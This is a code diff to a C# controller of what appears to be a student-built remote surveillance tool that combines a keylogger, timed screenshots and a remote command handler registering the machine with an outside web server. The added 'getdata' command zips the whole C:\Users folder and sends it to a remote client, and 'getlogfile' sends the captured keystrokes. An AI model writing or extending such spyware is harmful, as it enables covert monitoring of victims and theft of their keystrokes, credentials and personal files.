@@ -16,8 +16,11 @@ namespace idpaServer
         public const string APP_PATH = @"C:\Temp"; //Path where the Application saves Files
         public const string DATA_PATH = @"C:\Users"; //Path where the User Data is stored
         public const string KEYLOGFILE_NAME = @"\log.xml"; //The name of the LogFile
-        public const string PRINTSCREEN_PATH = APP_PATH + @"\PrintScreen.jpg"; //The Path where the Printscreens are stored
+        public const string ZIPFILE_NAME = @"\log.xml"; //The name of the Zipped File
+        public const string PRINTSCREEN_NAME = "PrintScreen"; //The name of the Print Screens
+        public const string PRINTSCREEN_PATH = APP_PATH + @"\PrintScreens\"; //The Path where the Printscreens are stored
         public const string LOG_PATH = Controller.APP_PATH + Controller.KEYLOGFILE_NAME; //Where the logfile will be stored
+        public const string ZIP_PATH = Controller.APP_PATH + Controller.ZIPFILE_NAME; //Where the logfile will be stored
 
         //API URLs
         public const string API_URI_SAVE_CLIENT_DATA = "http://www.swordbreacker.ch/idpa/index.php"; //URI for creating a new Entry in the Database for this PC
@@ -25,7 +28,7 @@ namespace idpaServer
         public const string API_URI_UPDATE_IP = "http://www.swordbreacker.ch/idpa/updateip.php"; //URI for Update the Entry with the new IP
 
         //Timer
-        public const int PRINT_SCREEN_INTERVAL = 2000; //Interval in which a Screenshot is taken -- Intervall in miliseconds 1000 = 1 sek default 60000
+        public const int PRINT_SCREEN_INTERVAL = 60000; //Interval in which a Screenshot is taken -- Intervall in miliseconds 1000 = 1 sek default 60000
         public const int KEY_LOG_INTERVAL = 10; //Intervall in which keys will be stored in the Logger Object
         public const int KEY_LOGFILE_INTERVAL = 30000; //Intervall in which the log file will be updated
 
@@ -33,23 +36,38 @@ namespace idpaServer
 
         //Variables
         public static string clientCommand;
+        private static int printScreenCount;
         private static string myPcName;
         private static string myWinVers;
         private static int myServerID;
-        private static string localIp;
-        private static string clientIp;
+        private static string localIp = "127.0.0.1";
+        private static string clientIp = "127.0.0.1";
 
         //Timers
         private static System.Timers.Timer timerPrintScreen;
         private static System.Timers.Timer timerKey;
         private static System.Timers.Timer timerKeyLogfile;
 
+        public static int PrintScreenCount
+        {
+            set
+            {
+                Properties.Settings.Default.printScreenCount = value;
+                Properties.Settings.Default.Save();
+            }
+            get
+            {
+                printScreenCount = Properties.Settings.Default.printScreenCount;
+                return printScreenCount;
+            }
+        }
+
         public static void Init()
         {
             myServerID = Properties.Settings.Default.id;
             myPcName = System.Environment.MachineName;
             myWinVers = Environment.OSVersion.ToString();
-            localIp = ConnectionManager.GetLocalIp();
+            //localIp = ConnectionManager.GetLocalIp();
 
             //Ist these Pc in the Webserver Database when no create Entry
             if (myServerID == 0)
@@ -107,8 +125,12 @@ namespace idpaServer
 
             switch (clientCommand)
             {
+                case "getlogfile":
+                    ConnectionManager.SendFileToClient(clientIp, LOG_PATH);
+                    break;
                 case "getdata":
-                    ConnectionManager.SendFileToClient("127.0.0.1", LOG_PATH);
+                    FileManager.ZipUserData(DATA_PATH, ZIP_PATH);
+                    ConnectionManager.SendFileToClient(clientIp, ZIP_PATH);
                     break;
                 case "ping":
                     Console.WriteLine("Pong");
@@ -124,7 +146,7 @@ namespace idpaServer
         private static void InitSavePrintScreen(object sender, EventArgs e)
         {
             Console.WriteLine("Logfie written");
-            FileManager.SavePrintScreen(PrintScreen.GetScreenshot(), PRINTSCREEN_PATH);
+            FileManager.SavePrintScreen(PrintScreen.GetScreenshot(), PRINTSCREEN_PATH, PRINTSCREEN_NAME);
         }
 
         private static void InitSaveLogFile(object sender, EventArgs e)
@@ -132,5 +154,4 @@ namespace idpaServer
             FileManager.SaveLogFile(LOG_PATH, Keylogger.GetLogger());
         }
     }
-      
 }
